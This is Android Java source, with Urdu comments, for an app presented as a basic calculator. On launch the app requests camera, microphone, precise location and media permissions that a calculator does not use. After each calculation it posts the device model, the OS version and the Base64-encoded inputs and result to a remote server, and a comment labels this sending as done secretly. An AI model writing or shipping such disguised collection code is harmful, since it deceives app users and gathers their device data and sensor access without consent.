package com.mycompany.myapp;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    // ────────────────────────────────────────────────
    //                  اپنا سرور لنک یہاں تبدیل کریں
    // ────────────────────────────────────────────────
    private static final String SERVER_URL = "https://your-server.com/api/calc-result";

    private EditText editNumber1, editNumber2;
    private TextView textResult;
    private ActivityResultLauncher<String[]> permissionLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // UI عناصر
        editNumber1 = findViewById(R.id.editNumber1);
        editNumber2 = findViewById(R.id.editNumber2);
        textResult = findViewById(R.id.textResult);

        Button btnAdd      = findViewById(R.id.btnAdd);
        Button btnSubtract = findViewById(R.id.btnSubtract);
        Button btnMultiply = findViewById(R.id.btnMultiply);
        Button btnDivide   = findViewById(R.id.btnDivide);

        btnAdd.setOnClickListener(v -> calculate("+"));
        btnSubtract.setOnClickListener(v -> calculate("-"));
        btnMultiply.setOnClickListener(v -> calculate("*"));
        btnDivide.setOnClickListener(v -> calculate("/"));

        // پرمیشن لانچر سیٹ اپ
        permissionLauncher = registerForActivityResult(
                new ActivityResultContracts.RequestMultiplePermissions(),
                permissions -> {
                    boolean allGranted = permissions.values().stream().allMatch(Boolean::booleanValue);
                    if (allGranted) {
                        Toast.makeText(this, "تمام پرمیشنز منظور ہو گئیں", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(this, "کچھ پرمیشنز انکار ہوئیں – کچھ فیچرز کام نہیں کریں گے", Toast.LENGTH_LONG).show();
                    }
                });

        // ایپ شروع ہوتے ہی پرمیشنز مانگیں
        requestAllPermissions();
    }

    // تمام ضروری پرمیشنز کی لسٹ (Android ورژن کے مطابق)
    private List<String> getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();

        // Android 13+ (Tiramisu) کے لیے میڈیا اور نوٹیفکیشن
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            // پرانے ورژن کے لیے سٹوریج
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
                permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
        }

        // مشترکہ خطرناک پرمیشنز
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);

        return permissions;
    }

    private void requestAllPermissions() {
        List<String> permissions = getRequiredPermissions();
        List<String> toRequest = new ArrayList<>();

        for (String perm : permissions) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(perm);
            }
        }

        if (!toRequest.isEmpty()) {
            permissionLauncher.launch(toRequest.toArray(new String[0]));
        } else {
            Toast.makeText(this, "تمام پرمیشنز پہلے سے موجود ہیں", Toast.LENGTH_SHORT).show();
        }
    }

    // کیلکولیشن لاجک
    private void calculate(String operator) {
        String input1 = editNumber1.getText().toString().trim();
        String input2 = editNumber2.getText().toString().trim();

        if (input1.isEmpty() || input2.isEmpty()) {
            Toast.makeText(this, "دونوں نمبر درج کریں", Toast.LENGTH_SHORT).show();
            return;
        }

        try {
            double num1 = Double.parseDouble(input1);
            double num2 = Double.parseDouble(input2);
            double result = 0;

            switch (operator) {
                case "+": result = num1 + num2; break;
                case "-": result = num1 - num2; break;
                case "*": result = num1 * num2; break;
                case "/":
                    if (num2 == 0) {
                        Toast.makeText(this, "صفر سے تقسیم نہیں ہو سکتی", Toast.LENGTH_LONG).show();
                        return;
                    }
                    result = num1 / num2;
                    break;
                default:
                    Toast.makeText(this, "غلط آپریشن", Toast.LENGTH_SHORT).show();
                    return;
            }

            String resultText = "نتیجہ: " + String.format("%.4f", result);
            textResult.setText(resultText);

            // نتیجہ سرور پر بھیجیں (خفیہ طور پر)
            sendToServer(num1, num2, operator, result);

        } catch (NumberFormatException e) {
            Toast.makeText(this, "غلط نمبر فارمیٹ", Toast.LENGTH_SHORT).show();
        }
    }

    // سرور پر ڈیٹا بھیجنا (Base64 encoded)
    private void sendToServer(double num1, double num2, String op, double result) {
        RequestQueue queue = Volley.newRequestQueue(this);

        StringRequest request = new StringRequest(Request.Method.POST, SERVER_URL,
                response -> Toast.makeText(this, "سرور جواب: " + response, Toast.LENGTH_LONG).show(),
                error -> Toast.makeText(this, "سرور ایرر: " + (error.getMessage() != null ? error.getMessage() : "نامعلوم"), Toast.LENGTH_LONG).show()) {

            @Override
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<>();

                // سادہ ڈیٹا
                params.put("device_model", Build.MODEL);
                params.put("android_version", String.valueOf(Build.VERSION.SDK_INT));

                // کیلکولیشن ڈیٹا – Base64 میں تبدیل
                String rawData = num1 + "|" + num2 + "|" + op + "|" + result;
                String encoded = Base64.encodeToString(rawData.getBytes(), Base64.DEFAULT);
                params.put("calc_data", encoded.trim());

                return params;
            }
        };

        queue.add(request);
    }
  }
